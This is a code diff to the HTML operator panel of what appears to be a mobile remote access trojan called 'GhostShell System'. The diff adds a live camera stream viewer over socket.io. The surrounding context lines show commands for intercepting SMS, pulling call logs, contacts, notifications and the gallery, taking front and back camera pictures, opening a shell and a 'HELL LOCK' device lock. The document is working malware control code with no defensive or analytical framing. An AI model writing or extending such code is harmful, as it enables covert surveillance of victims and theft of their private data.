@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GhostShell System</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
     <style>
         /* BASE SYSTEM STYLES */
         @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
@@ -287,6 +288,10 @@
                 b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">Target URL:</p><input id="ourl" value="https://google.com">`;
                 f.innerHTML = `<button class="action-btn" onclick="cmd('openurl '+document.getElementById('ourl').value)">FORCE OPEN</button>`;
                 return;
+            } else if(t === 'livestream') {
+                b.innerHTML = `<div style="text-align:center;"><img id="stream-viewer" src="" style="width:100%; max-width: 320px; border:1px solid var(--primary); background:#000; display:none;"></div><div id="stream-stat" style="color:var(--dim); text-align:center; margin-top:10px; font-size: 0.9rem;">Connecting to Stream...</div>`;
+                f.innerHTML = `<button class="action-btn" onclick="cmd('start_stream')">ACTIVATE STREAM</button><button class="action-btn red" onclick="cmd('stop_stream')">STOP STREAM</button>`;
+                return;
             }
 
             const map = { sms:'getsms', calls:'getcalllogs', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic', contacts:'getcontacts', info:'deviceinfo', gallery:'gallery' };
@@ -412,6 +417,7 @@
             document.getElementById('conn-stat').innerText = e ? "ESTABLISHED":"DISCONNECTED";
             document.getElementById('conn-stat').style.color = e ? "var(--primary)":"var(--danger)";
             const btns = [
+                {id:'livestream', i:'fa-tv', l:'LIVE STREAM'},
                 {id:'filemanager', i:'fa-terminal', l:'SYS SHELL'}, {id:'info', i:'fa-server', l:'SYS INFO'},
                 {id:'panic', i:'fa-skull-crossbones', l:'HELL LOCK'}, {id:'contacts', i:'fa-address-book', l:'CONTACTS'},
                 {id:'sms', i:'fa-comment-sms', l:'INTERCEPT'}, {id:'calls', i:'fa-phone-volume', l:'CALL LOGS'},
@@ -428,6 +434,18 @@
                 return `<div class="btn ${b.id==='flash'&&flash?'active':''}" onclick="${b.id==='flash'?'toggleFlash(this)':'openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`;
             }).join('');
         }
+
+        const socket = io();
+        socket.on('stream_frame', (data) => {
+            if (selId && data.id === selId) {
+                const img = document.getElementById('stream-viewer');
+                if (img) {
+                    img.src = 'data:image/jpeg;base64,' + data.frame;
+                    img.style.display = 'inline-block';
+                    document.getElementById('stream-stat').innerText = 'STREAM ACTIVE [REALTIME]';
+                }
+            }
+        });
         poll();
     </script>
 </body>
